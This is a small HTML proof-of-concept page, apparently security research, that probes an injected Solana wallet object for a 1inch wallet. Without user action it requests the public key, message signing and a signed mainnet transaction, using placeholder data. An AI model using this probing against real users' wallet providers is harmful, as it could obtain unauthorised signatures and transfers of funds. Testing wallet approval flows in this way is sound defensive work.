<!doctype html><html><head><meta charset="utf-8"><title>poc9e2</title>
<script>
let tries=0;
function out(m){var d=document.createElement('div');d.textContent=m;document.body.appendChild(d);}
async function tryAll(){
  var w=window.OneInchSolanaWallet;
  if(!w){out('NO WALLET OBJ tries='+tries++); if(tries<15){setTimeout(tryAll,1000);} return;}
  var keys=[]; for(var k in w){keys.push(k);}
  out('KEYS: '+keys.join(','));
  try{
    var r1=await w.request({method:'getPublicKey'});
    out('GETPUB '+JSON.stringify(r1).slice(0,60));
  }catch(e){out('GETPUB ERR '+e.message);}
  try{
    var msg='706f633965'; 
    var r2=await w.request({method:'signMessage',params:[msg]});
    out('SIGNMSG '+String(r2).slice(0,64));
  }catch(e){out('SIGNMSG ERR '+e.message);}
  try{
    var r3=await w.request({method:'signAndSendTransaction',params:['AAABBB','mainnet-beta']});
    out('SENDSIG '+String(r3).slice(0,80));
  }catch(e){out('SENDSIG ERR '+e.message);}
}
setTimeout(tryAll,1500);
</script></body></html>
